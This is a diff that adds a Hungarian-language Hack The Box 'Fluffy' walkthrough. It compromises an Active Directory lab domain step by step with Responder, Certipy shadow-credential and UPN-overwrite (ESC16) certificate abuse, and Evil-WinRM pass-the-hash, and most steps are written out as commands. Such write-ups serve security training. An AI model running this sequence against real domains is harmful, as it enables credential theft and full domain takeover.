@@ -1,6 +1,204 @@
-# HTB - Fluffy
 
-**Difficulty:** Medium  
-**IP:** 10.10.11.69  
-**OS:** Windows  
-**PrivEsc:** ESC16 (ADCS - UPN overwrite)
+# 🛡️ HTB - Fluffy | Teljes Writeup (Magyarul)
+
+## Célrendszer Információi
+- IP cím: `10.10.11.69`
+- Hostnév: `DC01.fluffy.htb`
+- Tartomány: `fluffy.htb`
+
+---
+
+## 🔍 1. Kezdeti feltérképezés
+
+### Nmap szkennelés
+```bash
+nmap Fluffy.htb -sV -T4
+```
+Nyitott portok:
+- 53 (DNS)
+- 88/464 (Kerberos)
+- 139/445 (SMB)
+- 389/636 (LDAP / LDAPS)
+- 3268/3269 (Global Catalog)
+- 5985 (WinRM)
+- 9389 (AD Web Services)
+
+![1.png](./1.png)
+
+---
+
+## 📂 2. SMB megosztások feltérképezése
+
+```bash
+smbclient -L //10.10.11.69
+```
+Hitelesített hozzáférés esetén elérhető megosztások:
+- `IT` → Olvasás / írás
+- `NETLOGON`, `SYSVOL` → Csak olvasás
+
+![2.png](./2.png)
+
+---
+
+## 🗃️ 3. SMB tartalom böngészése: IT megosztás
+
+```bash
+smbclient //10.10.11.69/IT -U j.fleischman
+```
+
+Talált fájlok:
+- KeePass archívumok
+- `.zip`, `.txt` és `.pdf` fájlok
+
+![3.png](./3.png)
+![4.png](./4.png)
+
+---
+
+## 🧠 4. BloodHound AD elemzés
+
+```bash
+bloodhound-python -u p.agila -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c All --zip
+```
+Talált elemek:
+- 1 tartomány
+- 10 felhasználó
+- 54 csoport
+- 1 számítógép
+
+![5.png](./5.png)
+
+---
+
+## 💉 5. Csomag feltöltés: Kezdeti hozzáférés teszt
+
+```bash
+smbclient //10.10.11.69/IT -U j.fleischman
+put exploit.zip
+```
+
+![6.png](./6.png)
+
+---
+
+## 🧲 6. Responderes támadás
+
+```bash
+sudo responder -I tun0 -wvF
+```
+
+![7.png](./7.png)
+
+---
+
+## 🩸 7. Shadow Credentials támadás (Certipy)
+
+```bash
+certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
+```
+
+NT hash megszerzése: `winrm_svc`
+
+![8.png](./8.png)
+
+---
+
+## 💻 8. Shell nyitása Evil-WinRM-mel
+
+```bash
+evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '<NT Hash>'
+```
+
+Elért fájl: `user.txt`
+
+![9.png](./9.png)
+
+---
+
+## 🔐 9. Certipy - Certificate Template sebezhetőségek
+
+```bash
+certipy-ad find -vulnerable -u CA_SVC -hashes :<hash> -dc-ip 10.10.11.69
+```
+
+![10.png](./10.png)
+![11.png](./11.png)
+![12.png](./12.png)
+
+---
+
+## 🧱 10. Jogosultságnövelés: UPN módosítás
+
+```bash
+certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' update -upn 'administrator'
+```
+
+![13.png](./13.png)
+
+---
+
+## 🕵️ 11. Shadow támadás újra: ca_svc fiók
+
+```bash
+certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc' -dc-ip '10.10.11.69'
+```
+
+![14.png](./14.png)
+
+---
+
+## 🪪 12. Kerberos cache exportálás
+
+```bash
+export KRB5CCNAME=ca_svc.ccache
+```
+
+![15.png](./15.png)
+
+---
+
+## 🧾 13. Cert kérelmezés (admin)
+
+```bash
+certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
+```
+
+Létrejön: `administrator.pfx`
+
+![16.png](./16.png)
+
+---
+
+## 🔓 14. Admin hash lekérése
+
+```bash
+certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+```
+
+![17.png](./17.png)
+
+---
+
+## 👑 15. Végső hozzáférés: Rendszergazda
+
+```bash
+evil-winrm -i 10.10.11.69 -u 'administrator' -H '<NT Hash>'
+```
+
+Elért fájl: `root.txt`
+
+![18.png](./18.png)
+
+---
+
+## ✅ Összefoglalás
+
+- **Kezdeti hozzáférés**: SMB + jelszó újrafelhasználás
+- **Enumeráció**: BloodHound, SMB megosztások
+- **Privilege escalation**: ADCS abuse Certipy-vel (Shadow + UPN override)
+- **Teljes tartománykompromittálás**: Administrator cert & Evil-WinRM segítségével
+
+---
+
+🛑 **Figyelem:** Ez a teszt kizárólag oktatási célból, engedélyezett laborban történt. Ne hajts végre semmilyen jogosulatlan szkennelést vagy támadást más rendszereken!
+
